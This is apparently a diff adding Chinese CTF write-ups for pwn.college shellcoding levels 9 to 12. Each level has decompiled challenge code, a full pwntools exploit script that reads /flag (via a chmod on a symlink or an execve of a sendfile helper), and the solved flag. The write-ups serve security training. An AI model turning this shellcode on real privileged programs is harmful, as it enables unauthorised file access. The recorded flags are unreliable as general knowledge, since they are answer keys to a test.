@@ -1435,14 +1435,14 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 }
 ```
 
-这题在读取数据大小上做了限制，只允许读入 18 bytes。并且读完后把 `buf` 的写权限移除了，因此我们不能通过类似 `read` 的这种 shellcode 把再读数据到别的地方之类的。`execve` 肯定也不可能了，明显会超过 18 bytes。这时候我们发现 `chmod` 是一个很不错的候选，但是不能直接对 `/flag` 使用 `chmod`，不然还是会超。不过既然超的原因是文件名太长，那我们不妨试试建立一个名称短一点的软链接，对软链接进行操作。
+这题在读取数据大小上做了限制，只允许读入 18 bytes。并且读完后把 `buf` 的写权限移除了，因此我们不能通过类似 `read` 的这种 shellcode 把再读数据到别的地方之类的。`execve` 肯定也不可能了，明显会超过 18 bytes。这时候我们发现 `chmod` 是一个很不错的候选，但是不能直接对 `/flag` 使用 `chmod`，不然还是会超。不过既然超的原因是文件名太长，那我们不妨试试建立一个名称短一点的软链接，对软链接进行操作。实测发现对软链接使用 `chmod` 会影响到源文件的权限。
 
 ### Exploit
 
 ```python
 #!/usr/bin/python3
 
-from pwn import ELF, asm, context, gdb, log, os, process, remote
+from pwn import ELF, asm, context, gdb, log, os, process, remote, shellcraft
 
 context(log_level="debug", terminal="kitty")
 
@@ -1517,3 +1517,715 @@ if __name__ == "__main__":
 ### Flag
 
 Flag: `pwn.college{swqZOtc9CdQUIFCMwrec4E5WBCi.0FNyIDL5cTNxgzW}`
+
+## Level 9
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Write and execute shellcode to read the flag, but your input has data inserted into it before being executed.
+
+### Write-up
+
+```c ins={44-48} del={40, 64} collapse={1-36, 52-60}
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  size_t v3; // rax
+  size_t v4; // rax
+  int fd; // [rsp+28h] [rbp-18h]
+  int k; // [rsp+2Ch] [rbp-14h]
+  const char **i; // [rsp+30h] [rbp-10h]
+  const char **j; // [rsp+38h] [rbp-8h]
+
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  puts(
+    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
+  puts(
+    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
+  puts(
+    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
+  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
+  for ( fd = 3; fd <= 9999; ++fd )
+    close(fd);
+  for ( i = argv; *i; ++i )
+  {
+    v3 = strlen(*i);
+    memset((void *)*i, 0, v3);
+  }
+  for ( j = envp; *j; ++j )
+  {
+    v4 = strlen(*j);
+    memset((void *)*j, 0, v4);
+  }
+  shellcode = mmap((void *)0x2A207000, 0x1000uLL, 7, 34, 0, 0LL);
+  if ( shellcode != (void *)706768896 )
+    __assert_fail("shellcode == (void *)0x2a207000", "/challenge/babyshell-level-9.c", 0x62u, "main");
+  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x2A207000);
+  puts("Reading 0x1000 bytes from stdin.\n");
+  shellcode_size = read(0, shellcode, 0x1000uLL);
+  if ( !shellcode_size )
+    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-9.c", 0x67u, "main");
+  puts("Executing filter...\n");
+  for ( k = 0; k < (unsigned __int64)shellcode_size; ++k )
+  {
+    if ( k / 10 % 2 == 1 )
+      *((_BYTE *)shellcode + k) = -52;
+  }
+  puts("This challenge modified your shellcode by overwriting every other 10 bytes with 0xcc. 0xcc, when interpreted as an");
+  puts(
+    "instruction is an `INT 3`, which is an interrupt to call into the debugger. You must avoid these modifications in your");
+  puts("shellcode.\n");
+  puts("Removing write permissions from first 4096 bytes of shellcode.\n");
+  if ( mprotect(shellcode, 0x1000uLL, 5) )
+    __assert_fail(
+      "mprotect(shellcode, 4096, PROT_READ|PROT_EXEC) == 0",
+      "/challenge/babyshell-level-9.c",
+      0x76u,
+      "main");
+  puts("This challenge is about to execute the following shellcode:\n");
+  print_disassembly(shellcode, shellcode_size);
+  puts(&byte_2635);
+  puts("Executing shellcode!\n");
+  ((void (*)(void))shellcode)();
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+这题每隔 `0xa` 字节使用 `0xa` 个 `int3` 中断替换 `0xa` 字节的指令。简单吧，每隔 `0xa` 字节给它塞 `0xa` 个 `nop` 好了，随它换。在此之前使用一条 `jmp` 跳转到 `int3` 之后确保不被 `int3` 干扰，继续执行就好了。
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import ELF, asm, context, gdb, log, os, process, remote
+
+context(log_level="debug", terminal="kitty")
+
+FILE = "./babyshell-level-9"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+def send_payload(target, payload):
+    try:
+        target.send(payload)
+        target.recvall(timeout=5)
+    except Exception as e:
+        log.exception(f"An error occurred while sending payload: {e}")
+
+
+def construct_payload():
+    shellcode = """
+    /* chmod(file='f', mode=4) */
+    /* push b'f\x00' */
+    push 0x66
+    mov rdi, rsp
+    push 4
+    pop rsi
+    /* call chmod() */
+    jmp continue
+    .rept 0xa
+        nop
+    .endr
+continue:
+    push 90 /* 0x5a */
+    pop rax
+    syscall
+    """
+
+    return asm(shellcode)
+
+
+def attack(target, payload):
+    os.system("ln -s /flag f")
+    send_payload(target, payload)
+
+    try:
+        with open("./f", "r") as file:
+            content = file.read()
+
+            log.success(content)
+    except FileNotFoundError:
+        log.error("The file './f' does not exist.")
+    except PermissionError:
+        log.error("Permission denied to read './f'.")
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    try:
+        target = launch()
+        payload = construct_payload()
+
+        attack(target, payload)
+    except Exception as e:
+        log.exception(f"An error occurred in main: {e}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Flag
+
+Flag: `pwn.college{YzFX3cOrT5abYZfD8oqct1wr3xc.0VNyIDL5cTNxgzW}`
+
+## Level 10
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Write and execute shellcode to read the flag, but your input is sorted before being executed!
+
+### Write-up
+
+```c ins={48-61} del={44, 70} collapse={1-40, 65-66}
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  size_t v3; // rax
+  size_t v4; // rax
+  int fd; // [rsp+28h] [rbp-38h]
+  int k; // [rsp+2Ch] [rbp-34h]
+  int m; // [rsp+30h] [rbp-30h]
+  int v10; // [rsp+34h] [rbp-2Ch]
+  const char **i; // [rsp+38h] [rbp-28h]
+  const char **j; // [rsp+40h] [rbp-20h]
+  _QWORD *v13; // [rsp+48h] [rbp-18h]
+  __int64 v14; // [rsp+50h] [rbp-10h]
+
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  puts(
+    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
+  puts(
+    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
+  puts(
+    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
+  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
+  for ( fd = 3; fd <= 9999; ++fd )
+    close(fd);
+  for ( i = argv; *i; ++i )
+  {
+    v3 = strlen(*i);
+    memset((void *)*i, 0, v3);
+  }
+  for ( j = envp; *j; ++j )
+  {
+    v4 = strlen(*j);
+    memset((void *)*j, 0, v4);
+  }
+  shellcode = mmap((void *)0x24AA2000, 0x1000uLL, 7, 34, 0, 0LL);
+  if ( shellcode != (void *)615129088 )
+    __assert_fail("shellcode == (void *)0x24aa2000", "/challenge/babyshell-level-10.c", 0x62u, "main");
+  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x24AA2000);
+  puts("Reading 0x1000 bytes from stdin.\n");
+  shellcode_size = read(0, shellcode, 0x1000uLL);
+  if ( !shellcode_size )
+    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-10.c", 0x67u, "main");
+  puts("Executing filter...\n");
+  v13 = shellcode;
+  v10 = ((unsigned __int64)shellcode_size >> 3) - 1;
+  for ( k = 0; k < v10; ++k )
+  {
+    for ( m = 0; m < v10 - k - 1; ++m )
+    {
+      if ( v13[m] > v13[m + 1] )
+      {
+        v14 = v13[m];
+        v13[m] = v13[m + 1];
+        v13[m + 1] = v14;
+      }
+    }
+  }
+  puts(
+    "This challenge just sorted your shellcode using bubblesort. Keep in mind the impact of memory endianness on this sort");
+  puts("(e.g., the LSB being the right-most byte).\n");
+  printf("This sort processed your shellcode %d bytes at a time.\n", 8);
+  puts("This challenge is about to execute the following shellcode:\n");
+  print_disassembly(shellcode, shellcode_size);
+  puts(&byte_259D);
+  puts("Executing shellcode!\n");
+  ((void (*)(void))shellcode)();
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+如果你的 shellcode 足够长的话会对部分指令进行冒泡排序，但是如果比较短的话这个限制就形同虚设了。这里我直接用之前的 exp 了。
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import ELF, asm, context, gdb, log, os, process, remote, shellcraft
+
+context(log_level="debug", terminal="kitty")
+
+FILE = "./babyshell-level-10"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+def send_payload(target, payload):
+    try:
+        target.send(payload)
+        target.recvall(timeout=5)
+    except Exception as e:
+        log.exception(f"An error occurred while sending payload: {e}")
+
+
+def construct_payload():
+    shellcode = shellcraft.chmod("f", 0o4)
+
+    return asm(shellcode)
+
+
+def attack(target, payload):
+    os.system("ln -s /flag f")
+    send_payload(target, payload)
+
+    try:
+        with open("./f", "r") as file:
+            content = file.read()
+
+            log.success(content)
+    except FileNotFoundError:
+        log.error("The file './f' does not exist.")
+    except PermissionError:
+        log.error("Permission denied to read './f'.")
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    try:
+        target = launch()
+        payload = construct_payload()
+
+        attack(target, payload)
+    except Exception as e:
+        log.exception(f"An error occurred in main: {e}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Flag
+
+Flag: `pwn.college{g5e9JB4cUp4THYN75FdmwWgVFA3.0lNyIDL5cTNxgzW}`
+
+## Level 11
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Write and execute shellcode to read the flag, but your input is sorted before being executed and stdin is closed.
+
+### Write-up
+
+```c ins={48-61, 72-73} del={44, 75} collapse={1-40, 65-68}
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  size_t v3; // rax
+  size_t v4; // rax
+  int fd; // [rsp+28h] [rbp-38h]
+  int k; // [rsp+2Ch] [rbp-34h]
+  int m; // [rsp+30h] [rbp-30h]
+  int v10; // [rsp+34h] [rbp-2Ch]
+  const char **i; // [rsp+38h] [rbp-28h]
+  const char **j; // [rsp+40h] [rbp-20h]
+  _QWORD *v13; // [rsp+48h] [rbp-18h]
+  __int64 v14; // [rsp+50h] [rbp-10h]
+
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  puts(
+    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
+  puts(
+    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
+  puts(
+    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
+  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
+  for ( fd = 3; fd <= 9999; ++fd )
+    close(fd);
+  for ( i = argv; *i; ++i )
+  {
+    v3 = strlen(*i);
+    memset((void *)*i, 0, v3);
+  }
+  for ( j = envp; *j; ++j )
+  {
+    v4 = strlen(*j);
+    memset((void *)*j, 0, v4);
+  }
+  shellcode = mmap((void *)0x21A35000, 0x1000uLL, 7, 34, 0, 0LL);
+  if ( shellcode != (void *)564350976 )
+    __assert_fail("shellcode == (void *)0x21a35000", "/challenge/babyshell-level-11.c", 0x62u, "main");
+  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x21A35000);
+  puts("Reading 0x1000 bytes from stdin.\n");
+  shellcode_size = read(0, shellcode, 0x1000uLL);
+  if ( !shellcode_size )
+    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-11.c", 0x67u, "main");
+  puts("Executing filter...\n");
+  v13 = shellcode;
+  v10 = ((unsigned __int64)shellcode_size >> 3) - 1;
+  for ( k = 0; k < v10; ++k )
+  {
+    for ( m = 0; m < v10 - k - 1; ++m )
+    {
+      if ( v13[m] > v13[m + 1] )
+      {
+        v14 = v13[m];
+        v13[m] = v13[m + 1];
+        v13[m + 1] = v14;
+      }
+    }
+  }
+  puts(
+    "This challenge just sorted your shellcode using bubblesort. Keep in mind the impact of memory endianness on this sort");
+  puts("(e.g., the LSB being the right-most byte).\n");
+  printf("This sort processed your shellcode %d bytes at a time.\n", 8);
+  puts("This challenge is about to execute the following shellcode:\n");
+  print_disassembly(shellcode, shellcode_size);
+  puts(byte_259D);
+  puts(
+    "This challenge is about to close stdin, which means that it will be harder to pass in a stage-2 shellcode. You will need");
+  puts("to figure an alternate solution (such as unpacking shellcode in memory) to get past complex filters.\n");
+  if ( fclose(stdin) )
+    __assert_fail("fclose(stdin) == 0", "/challenge/babyshell-level-11.c", 0x7Fu, "main");
+  puts("Executing shellcode!\n");
+  ((void (*)(void))shellcode)();
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+就算你把 `stdin` 也关了又如何，不还是无法阻止我使用之前的 exp 哈哈哈哈哈哈哈。
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import ELF, asm, context, gdb, log, os, process, remote, shellcraft
+
+context(log_level="debug", terminal="kitty")
+
+FILE = "./babyshell-level-11"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+def send_payload(target, payload):
+    try:
+        target.send(payload)
+        target.recvall(timeout=5)
+    except Exception as e:
+        log.exception(f"An error occurred while sending payload: {e}")
+
+
+def construct_payload():
+    shellcode = shellcraft.chmod("f", 0o4)
+
+    return asm(shellcode)
+
+
+def attack(target, payload):
+    os.system("ln -s /flag f")
+    send_payload(target, payload)
+
+    try:
+        with open("./f", "r") as file:
+            content = file.read()
+
+            log.success(content)
+    except FileNotFoundError:
+        log.error("The file './f' does not exist.")
+    except PermissionError:
+        log.error("Permission denied to read './f'.")
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    try:
+        target = launch()
+        payload = construct_payload()
+
+        attack(target, payload)
+    except Exception as e:
+        log.exception(f"An error occurred in main: {e}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Flag
+
+Flag: `pwn.college{Ed61x95iAxED3sEmx4x19WauOCW.01NyIDL5cTNxgzW}`
+
+## Level 12
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Write and execute shellcode to read the flag, but every byte in your input must be unique.
+
+### Write-up
+
+```c ins={47-56} del={42, 61} collapse={1-38}
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  size_t v3; // rax
+  size_t v4; // rax
+  int fd; // [rsp+28h] [rbp-128h]
+  int k; // [rsp+2Ch] [rbp-124h]
+  const char **i; // [rsp+30h] [rbp-120h]
+  const char **j; // [rsp+38h] [rbp-118h]
+  _QWORD v11[34]; // [rsp+40h] [rbp-110h] BYREF
+
+  v11[33] = __readfsqword(0x28u);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  puts(
+    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
+  puts(
+    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
+  puts(
+    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
+  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
+  for ( fd = 3; fd <= 9999; ++fd )
+    close(fd);
+  for ( i = argv; *i; ++i )
+  {
+    v3 = strlen(*i);
+    memset((void *)*i, 0, v3);
+  }
+  for ( j = envp; *j; ++j )
+  {
+    v4 = strlen(*j);
+    memset((void *)*j, 0, v4);
+  }
+  shellcode = mmap((void *)0x1C246000, 0x1000uLL, 7, 34, 0, 0LL);
+  if ( shellcode != (void *)472145920 )
+    __assert_fail("shellcode == (void *)0x1c246000", "/challenge/babyshell-level-12.c", 0x62u, "main");
+  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x1C246000);
+  puts("Reading 0x1000 bytes from stdin.\n");
+  shellcode_size = read(0, shellcode, 0x1000uLL);
+  if ( !shellcode_size )
+    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-12.c", 0x67u, "main");
+  puts("Executing filter...\n");
+  puts("This challenge requires that every byte in your shellcode is unique!\n");
+  memset(v11, 0, 256);
+  for ( k = 0; k < (unsigned __int64)shellcode_size; ++k )
+  {
+    if ( *((_BYTE *)v11 + *((unsigned __int8 *)shellcode + k)) )
+    {
+      printf("Failed filter at byte %d!\n", k);
+      exit(1);
+    }
+    *((_BYTE *)v11 + *((unsigned __int8 *)shellcode + k)) = 1;
+  }
+  puts("This challenge is about to execute the following shellcode:\n");
+  print_disassembly(shellcode, shellcode_size);
+  puts(&byte_2525);
+  puts("Executing shellcode!\n");
+  ((void (*)(void))shellcode)();
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+就你要每一个字节都得唯一是吧，`execve` 调用外部 shellcode 秒了！
+
+`cdq` 是一字节指令，有时候用来取代 `xor edx, edx` 很不错。它的作用请参考 [CWD/CDQ/CQO — Convert Word to Doubleword/Convert Doubleword to Quadword](https://www.felixcloutier.com/x86/cwd:cdq:cqo).
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import ELF, asm, context, gdb, log, pause, process, remote
+
+context(log_level="debug", terminal="kitty")
+
+FILE = "./babyshell-level-12"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+def send_payload(target, payload):
+    try:
+        target.send(payload)
+    except Exception as e:
+        log.exception(f"An error occurred while sending payload: {e}")
+
+
+def construct_payload():
+    shellcode = """
+    /* execve(path='a', argv=0, envp=0) */
+    /* push b'a\x00' */
+    push 0x61
+    mov rdi, rsp
+    xor esi, esi
+    cdq
+    /* call execve() */
+    mov al, 59 /* 0x3b */
+    syscall
+    """
+
+    return asm(shellcode)
+
+
+def attack(target, payload):
+    try:
+        send_payload(target, payload)
+
+        response = target.recvall(timeout=5)
+
+        return b"pwn.college{" in response
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    try:
+        target = launch()
+        payload = construct_payload()
+
+        if attack(target, payload):
+            log.success("Success! Exiting...")
+
+            pause()
+            exit()
+    except Exception as e:
+        log.exception(f"An error occurred in main: {e}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+我们的 shellcode 的目的就是加载外部脚本完成剩余攻击步骤。注意把下面脚本编译为 `a`（文件名）。
+
+```c
+#include <fcntl.h>
+#include <sys/sendfile.h>
+
+int main() {
+  sendfile(1, open("/flag", O_RDONLY), 0, 0x1000);
+
+  return 0;
+}
+```
+
+### Flag
+
+Flag: `pwn.college{g4UdtC88x4ayx2CjkFQNdxcSBsC.0FOyIDL5cTNxgzW}`
